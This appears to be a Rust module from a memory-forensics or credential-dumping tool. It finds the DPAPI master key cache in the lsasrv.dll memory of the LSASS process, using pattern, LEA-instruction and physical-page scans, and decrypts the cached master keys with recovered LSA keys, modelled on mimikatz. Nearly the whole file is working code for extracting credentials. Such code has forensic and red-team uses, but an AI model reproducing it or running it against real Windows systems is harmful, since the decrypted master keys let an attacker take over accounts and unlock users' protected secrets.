use crate::error::Result;
use crate::lsass::crypto::{self, CryptoKeys};
use crate::lsass::patterns;
use crate::lsass::types::DpapiCredential;
use crate::memory::{PhysicalMemory, VirtualMemory};
use crate::paging::translate::PageTableWalker;
use crate::pe::parser::PeHeaders;

/// KIWI_MASTERKEY_CACHE_ENTRY offsets (same for all x64 Windows versions).
///
/// Layout (verified against mimikatz + pypykatz):
///   +0x00: Flink (8B)
///   +0x08: Blink (8B)
///   +0x10: LUID (8B)
///   +0x18: GUID (16B)
///   +0x28: insertTime (FILETIME, 8B)
///   +0x30: keySize (ULONG, 4B)
///   +0x34: key[] (encrypted, variable length)
const OFF_FLINK: u64 = 0x00;
const OFF_LUID: u64 = 0x10;
const OFF_GUID: u64 = 0x18;
const OFF_KEY_SIZE: u64 = 0x30;
const OFF_KEY_DATA: u64 = 0x34;

/// Extract DPAPI master key cache entries from lsasrv.dll.
///
/// Keys are stored encrypted with LsaProtectMemory (3DES/AES) and must be decrypted.
pub fn extract_dpapi_credentials(
    vmem: &impl VirtualMemory,
    lsasrv_base: u64,
    _lsasrv_size: u32,
    keys: &CryptoKeys,
) -> Result<Vec<(u64, DpapiCredential)>> {
    let pe = PeHeaders::parse_from_memory(vmem, lsasrv_base)?;

    // Try .text pattern scan first, then LEA-to-data scan, then .data section scan
    let list_addr = match pe.find_section(".text") {
        Some(text) => {
            let text_base = lsasrv_base + text.virtual_address as u64;
            match patterns::find_pattern(
                vmem,
                text_base,
                text.virtual_size,
                patterns::DPAPI_MASTER_KEY_PATTERNS,
                "g_MasterKeyCacheList",
            ) {
                Ok((pattern_addr, _)) => {
                    patterns::find_list_via_lea(vmem, pattern_addr, "g_MasterKeyCacheList")?
                }
                Err(e) => {
                    log::debug!(
                        "DPAPI .text pattern scan failed ({}), trying LEA-to-data scan",
                        e
                    );
                    match find_dpapi_list_via_lea_scan(vmem, &pe, lsasrv_base) {
                        Ok(addr) => addr,
                        Err(e2) => {
                            log::debug!(
                                "DPAPI LEA-to-data scan failed ({}), trying .data fallback",
                                e2
                            );
                            find_dpapi_list_in_data(vmem, &pe, lsasrv_base)?
                        }
                    }
                }
            }
        }
        None => find_dpapi_list_in_data(vmem, &pe, lsasrv_base)?,
    };

    log::info!("DPAPI g_MasterKeyCacheList at 0x{:x}", list_addr);
    walk_masterkey_list(vmem, list_addr, keys)
}

/// Walk the g_MasterKeyCacheList linked list and extract entries.
fn walk_masterkey_list(
    vmem: &impl VirtualMemory,
    list_addr: u64,
    keys: &CryptoKeys,
) -> Result<Vec<(u64, DpapiCredential)>> {
    let mut results = Vec::new();

    let head_flink = vmem.read_virt_u64(list_addr)?;
    if head_flink == 0 || head_flink == list_addr {
        log::info!("DPAPI: master key cache is empty");
        return Ok(results);
    }

    let mut current = head_flink;
    let mut visited = std::collections::HashSet::new();

    loop {
        if current == list_addr || visited.contains(&current) || current == 0 {
            break;
        }
        visited.insert(current);

        if let Some(cred) = read_and_decrypt_entry(vmem, current, keys) {
            results.push(cred);
        }

        current = match vmem.read_virt_u64(current + OFF_FLINK) {
            Ok(f) => f,
            Err(_) => break,
        };
    }

    log::info!("DPAPI: found {} master key cache entries", results.len());
    Ok(results)
}

/// Read a single DPAPI cache entry and decrypt its key.
fn read_and_decrypt_entry(
    vmem: &impl VirtualMemory,
    entry_addr: u64,
    keys: &CryptoKeys,
) -> Option<(u64, DpapiCredential)> {
    let luid = vmem.read_virt_u64(entry_addr + OFF_LUID).ok()?;
    let key_size = vmem.read_virt_u32(entry_addr + OFF_KEY_SIZE).ok()?;
    if key_size == 0 || key_size > 256 {
        return None;
    }

    let guid_bytes = vmem.read_virt_bytes(entry_addr + OFF_GUID, 16).ok()?;
    if guid_bytes.iter().all(|&b| b == 0) {
        return None;
    }
    let guid = format_guid(&guid_bytes);

    let enc_key = vmem
        .read_virt_bytes(entry_addr + OFF_KEY_DATA, key_size as usize)
        .ok()?;

    // Decrypt with 3DES/AES (same as all other credential providers)
    let dec_key = match crypto::decrypt_credential(keys, &enc_key) {
        Ok(k) => k,
        Err(e) => {
            log::debug!("DPAPI: failed to decrypt key for GUID={}: {}", guid, e);
            return None;
        }
    };

    let sha1 = sha1_digest(&dec_key);
    log::debug!(
        "DPAPI: LUID=0x{:x} GUID={} key_size={}",
        luid,
        guid,
        key_size
    );
    Some((
        luid,
        DpapiCredential {
            guid,
            key: dec_key,
            key_size,
            sha1_masterkey: sha1,
        },
    ))
}

/// Scan lsasrv.dll .text for LEA instructions referencing .data addresses,
/// then validate each target as a potential g_MasterKeyCacheList.
fn find_dpapi_list_via_lea_scan(
    vmem: &impl VirtualMemory,
    pe: &PeHeaders,
    lsasrv_base: u64,
) -> Result<u64> {
    let text = pe.find_section(".text").ok_or_else(|| {
        crate::error::GovmemError::PatternNotFound(".text section in lsasrv.dll".to_string())
    })?;
    let data_sec = pe.find_section(".data").ok_or_else(|| {
        crate::error::GovmemError::PatternNotFound(".data section in lsasrv.dll".to_string())
    })?;

    let text_base = lsasrv_base + text.virtual_address as u64;
    let text_size = text.virtual_size as usize;
    let data_base = lsasrv_base + data_sec.virtual_address as u64;
    let data_end = data_base + data_sec.virtual_size as u64;

    let chunk_size = 0x10000usize;
    let mut candidates = Vec::new();

    for chunk_off in (0..text_size).step_by(chunk_size) {
        let read_size = std::cmp::min(chunk_size + 16, text_size - chunk_off);
        let chunk = match vmem.read_virt_bytes(text_base + chunk_off as u64, read_size) {
            Ok(d) => d,
            Err(_) => continue,
        };

        for i in 0..chunk.len().saturating_sub(7) {
            let rex = chunk[i];
            if rex != 0x48 && rex != 0x4C {
                continue;
            }
            if chunk[i + 1] != 0x8D {
                continue;
            }
            let modrm = chunk[i + 2];
            if modrm & 0xC7 != 0x05 {
                continue;
            }
            let disp = i32::from_le_bytes([chunk[i + 3], chunk[i + 4], chunk[i + 5], chunk[i + 6]]);
            let rip = text_base + (chunk_off + i) as u64 + 7;
            let target = (rip as i64 + disp as i64) as u64;
            if target < data_base || target >= data_end {
                continue;
            }
            candidates.push(target);
        }
    }

    candidates.sort_unstable();
    candidates.dedup();
    log::debug!(
        "DPAPI LEA scan: {} unique .data targets found",
        candidates.len()
    );

    for target in &candidates {
        if validate_dpapi_list_head(vmem, *target, lsasrv_base) {
            log::info!(
                "DPAPI LEA scan: found g_MasterKeyCacheList at 0x{:x}",
                target
            );
            return Ok(*target);
        }
    }

    Err(crate::error::GovmemError::PatternNotFound(
        "g_MasterKeyCacheList via LEA-to-data scan".to_string(),
    ))
}

/// Fallback: scan lsasrv.dll .data section for g_MasterKeyCacheList LIST_ENTRY head.
fn find_dpapi_list_in_data(
    vmem: &impl VirtualMemory,
    pe: &PeHeaders,
    lsasrv_base: u64,
) -> Result<u64> {
    let data_sec = pe.find_section(".data").ok_or_else(|| {
        crate::error::GovmemError::PatternNotFound(".data section in lsasrv.dll".to_string())
    })?;

    let data_base = lsasrv_base + data_sec.virtual_address as u64;
    let data_size = std::cmp::min(data_sec.virtual_size as usize, 0x20000);
    let data = vmem.read_virt_bytes(data_base, data_size)?;

    log::debug!(
        "DPAPI: scanning .data for g_MasterKeyCacheList: base=0x{:x} size=0x{:x}",
        data_base,
        data_size
    );

    for off in (0..data_size.saturating_sub(16)).step_by(8) {
        let flink = u64::from_le_bytes(data[off..off + 8].try_into().unwrap());
        let blink = u64::from_le_bytes(data[off + 8..off + 16].try_into().unwrap());
        if flink < 0x10000 || (flink >> 48) != 0 || blink < 0x10000 || (blink >> 48) != 0 {
            continue;
        }
        if flink >= lsasrv_base && flink < lsasrv_base + 0x200000 {
            continue;
        }
        let list_addr = data_base + off as u64;
        if flink == list_addr && blink == list_addr {
            continue;
        }
        if validate_dpapi_list_head(vmem, list_addr, lsasrv_base) {
            log::debug!("DPAPI: found g_MasterKeyCacheList at 0x{:x}", list_addr);
            return Ok(list_addr);
        }
    }

    Err(crate::error::GovmemError::PatternNotFound(
        "g_MasterKeyCacheList in lsasrv.dll .data section".to_string(),
    ))
}

/// Validate a candidate LIST_ENTRY head as g_MasterKeyCacheList.
fn validate_dpapi_list_head(vmem: &impl VirtualMemory, head: u64, lsasrv_base: u64) -> bool {
    let flink = match vmem.read_virt_u64(head) {
        Ok(f) => f,
        Err(_) => return false,
    };
    if flink < 0x10000 || (flink >> 48) != 0 || flink == head {
        return false;
    }
    if flink >= lsasrv_base && flink < lsasrv_base + 0x200000 {
        return false;
    }
    // Entry's Blink should point back to head
    let entry_blink = match vmem.read_virt_u64(flink + 8) {
        Ok(b) => b,
        Err(_) => return false,
    };
    if entry_blink != head {
        return false;
    }
    // LUID at +0x10 should be reasonable
    let luid = match vmem.read_virt_u64(flink + OFF_LUID) {
        Ok(l) => l,
        Err(_) => return false,
    };
    if luid > 0xFFFF_FFFF {
        return false;
    }
    // key_size at +0x30 should be 32, 48, or 64
    let key_size = match vmem.read_virt_u32(flink + OFF_KEY_SIZE) {
        Ok(k) => k,
        Err(_) => return false,
    };
    if !matches!(key_size, 32 | 48 | 64) {
        return false;
    }
    // GUID at +0x18 should not be all zeros
    let guid_bytes = match vmem.read_virt_bytes(flink + OFF_GUID, 16) {
        Ok(g) => g,
        Err(_) => return false,
    };
    if guid_bytes.iter().all(|&b| b == 0) {
        return false;
    }
    let d1 = u32::from_le_bytes([guid_bytes[0], guid_bytes[1], guid_bytes[2], guid_bytes[3]]);
    d1 != 0
}

/// Physical scan for DPAPI master key cache entries in LSASS pages.
///
/// When pattern-based scanning fails (lsasrv.dll .data paged out), directly
/// scan LSASS physical pages for KIWI_MASTERKEY_CACHE_ENTRY structures.
///
/// Structure (all x64 Windows):
///   +0x00: Flink (heap ptr)
///   +0x08: Blink (heap ptr or .data addr)
///   +0x10: LUID (u64, < 0xFFFFFFFF)
///   +0x18: GUID (16 bytes, non-zero)
///   +0x28: insertTime (FILETIME)
///   +0x30: keySize (u32: 32, 48, or 64)
///   +0x34: key[] (encrypted, keySize bytes)
pub fn extract_dpapi_physical_scan<P: PhysicalMemory>(
    phys: &P,
    lsass_dtb: u64,
    vmem: &impl VirtualMemory,
    keys: &CryptoKeys,
) -> Vec<(u64, DpapiCredential)> {
    let walker = PageTableWalker::new(phys);
    let mut results = Vec::new();
    let mut pages_scanned = 0u64;
    let mut candidates: Vec<u64> = Vec::new();

    log::info!("DPAPI physical scan: searching LSASS pages for master key cache entries...");

    walker.enumerate_present_pages(lsass_dtb, |mapping| {
        if mapping.size != 0x1000 {
            return;
        }
        pages_scanned += 1;

        let page_data = match phys.read_phys_bytes(mapping.paddr, 0x1000) {
            Ok(d) => d,
            Err(_) => return,
        };
        if page_data.iter().all(|&b| b == 0) {
            return;
        }

        // Entry needs: 0x34 (key offset) + 64 (max key) = 0x74 bytes
        for off in (0..0x1000usize.saturating_sub(0x74)).step_by(8) {
            if try_dpapi_entry_match(&page_data, off) {
                candidates.push(mapping.vaddr + off as u64);
            }
        }
    });

    log::info!(
        "DPAPI physical scan: {} pages scanned, {} candidates",
        pages_scanned,
        candidates.len()
    );

    let mut seen_guids = std::collections::HashSet::new();

    for vaddr in &candidates {
        let luid = vmem.read_virt_u64(*vaddr + OFF_LUID).unwrap_or(0);
        if luid == 0 || luid > 0xFFFF_FFFF {
            continue;
        }
        let key_size = vmem.read_virt_u32(*vaddr + OFF_KEY_SIZE).unwrap_or(0);
        if !matches!(key_size, 32 | 48 | 64) {
            continue;
        }
        let guid_bytes = match vmem.read_virt_bytes(*vaddr + OFF_GUID, 16) {
            Ok(g) => g,
            Err(_) => continue,
        };
        if guid_bytes.iter().all(|&b| b == 0) {
            continue;
        }
        // Validate GUID doesn't look like ASCII text (false positive filter)
        if guid_bytes
            .iter()
            .all(|&b| b.is_ascii_graphic() || b == 0 || b == b' ')
        {
            continue;
        }
        let guid = format_guid(&guid_bytes);
        if !seen_guids.insert(guid.clone()) {
            continue;
        }

        let enc_key = match vmem.read_virt_bytes(*vaddr + OFF_KEY_DATA, key_size as usize) {
            Ok(k) => k,
            Err(_) => continue,
        };
        // Encrypted key should not be all zeros
        if enc_key.iter().all(|&b| b == 0) {
            continue;
        }

        // Decrypt with 3DES/AES
        let dec_key = match crypto::decrypt_credential(keys, &enc_key) {
            Ok(k) => k,
            Err(_) => continue,
        };

        let sha1 = sha1_digest(&dec_key);
        log::info!(
            "DPAPI phys-scan: LUID=0x{:x} GUID={} key_size={}",
            luid,
            guid,
            key_size
        );
        results.push((
            luid,
            DpapiCredential {
                guid,
                key: dec_key,
                key_size,
                sha1_masterkey: sha1,
            },
        ));
    }

    log::info!("DPAPI physical scan: {} entries extracted", results.len());
    results
}

/// Check if a page region at `off` matches a DPAPI master key cache entry signature.
fn try_dpapi_entry_match(page: &[u8], off: usize) -> bool {
    if off + 0x74 > page.len() {
        return false;
    }
    // Flink at +0x00: valid user-mode pointer
    let flink = u64::from_le_bytes(page[off..off + 8].try_into().unwrap());
    if flink < 0x10000 || (flink >> 48) != 0 {
        return false;
    }
    // Blink at +0x08: valid pointer
    let blink = u64::from_le_bytes(page[off + 8..off + 16].try_into().unwrap());
    if blink < 0x10000 || (blink >> 48) != 0 {
        return false;
    }
    // LUID at +0x10: reasonable
    let luid = u64::from_le_bytes(page[off + 0x10..off + 0x18].try_into().unwrap());
    if luid == 0 || luid > 0xFFFF_FFFF {
        return false;
    }
    // GUID at +0x18: first u32 non-zero
    let guid_d1 = u32::from_le_bytes(page[off + 0x18..off + 0x1C].try_into().unwrap());
    if guid_d1 == 0 {
        return false;
    }
    // GUID should not be all ASCII (false positive filter)
    let guid_slice = &page[off + 0x18..off + 0x28];
    if guid_slice
        .iter()
        .all(|&b| b.is_ascii_graphic() || b == 0 || b == b' ')
    {
        return false;
    }
    // insertTime at +0x28: FILETIME should be a reasonable date (2000-2040)
    // High DWORD of FILETIME for year 2000 ≈ 0x01BF..., year 2040 ≈ 0x01E0...
    let ft_high = u32::from_le_bytes(page[off + 0x2C..off + 0x30].try_into().unwrap());
    if !(0x01BF_0000..=0x01E0_0000).contains(&ft_high) {
        return false;
    }
    // key_size at +0x30: must be 32, 48, or 64
    let key_size = u32::from_le_bytes(page[off + 0x30..off + 0x34].try_into().unwrap());
    if !matches!(key_size, 32 | 48 | 64) {
        return false;
    }
    // key data at +0x34: first 16 bytes shouldn't be all zero
    let key_start = &page[off + 0x34..off + 0x34 + std::cmp::min(key_size as usize, 16)];
    if key_start.iter().all(|&b| b == 0) {
        return false;
    }
    true
}

/// SHA-1 digest for computing sha1_masterkey.
fn sha1_digest(data: &[u8]) -> [u8; 20] {
    let (mut h0, mut h1, mut h2, mut h3, mut h4) = (
        0x67452301u32,
        0xEFCDAB89u32,
        0x98BADCFEu32,
        0x10325476u32,
        0xC3D2E1F0u32,
    );
    let bit_len = (data.len() as u64) * 8;
    let mut msg = data.to_vec();
    msg.push(0x80);
    while msg.len() % 64 != 56 {
        msg.push(0);
    }
    msg.extend_from_slice(&bit_len.to_be_bytes());
    for block in msg.chunks(64) {
        let mut w = [0u32; 80];
        for i in 0..16 {
            w[i] = u32::from_be_bytes([
                block[i * 4],
                block[i * 4 + 1],
                block[i * 4 + 2],
                block[i * 4 + 3],
            ]);
        }
        for i in 16..80 {
            w[i] = (w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16]).rotate_left(1);
        }
        let (mut a, mut b, mut c, mut d, mut e) = (h0, h1, h2, h3, h4);
        for (i, &wi) in w.iter().enumerate() {
            let (f, k) = match i {
                0..=19 => ((b & c) | ((!b) & d), 0x5A827999u32),
                20..=39 => (b ^ c ^ d, 0x6ED9EBA1u32),
                40..=59 => ((b & c) | (b & d) | (c & d), 0x8F1BBCDCu32),
                _ => (b ^ c ^ d, 0xCA62C1D6u32),
            };
            let temp = a
                .rotate_left(5)
                .wrapping_add(f)
                .wrapping_add(e)
                .wrapping_add(k)
                .wrapping_add(wi);
            e = d;
            d = c;
            c = b.rotate_left(30);
            b = a;
            a = temp;
        }
        h0 = h0.wrapping_add(a);
        h1 = h1.wrapping_add(b);
        h2 = h2.wrapping_add(c);
        h3 = h3.wrapping_add(d);
        h4 = h4.wrapping_add(e);
    }
    let mut r = [0u8; 20];
    r[0..4].copy_from_slice(&h0.to_be_bytes());
    r[4..8].copy_from_slice(&h1.to_be_bytes());
    r[8..12].copy_from_slice(&h2.to_be_bytes());
    r[12..16].copy_from_slice(&h3.to_be_bytes());
    r[16..20].copy_from_slice(&h4.to_be_bytes());
    r
}

/// Format a 16-byte GUID as "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx".
fn format_guid(bytes: &[u8]) -> String {
    if bytes.len() < 16 {
        return hex::encode(bytes);
    }
    let d1 = u32::from_le_bytes([bytes[0], bytes[1], bytes[2], bytes[3]]);
    let d2 = u16::from_le_bytes([bytes[4], bytes[5]]);
    let d3 = u16::from_le_bytes([bytes[6], bytes[7]]);
    format!(
        "{:08x}-{:04x}-{:04x}-{:02x}{:02x}-{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}",
        d1,
        d2,
        d3,
        bytes[8],
        bytes[9],
        bytes[10],
        bytes[11],
        bytes[12],
        bytes[13],
        bytes[14],
        bytes[15],
    )
}
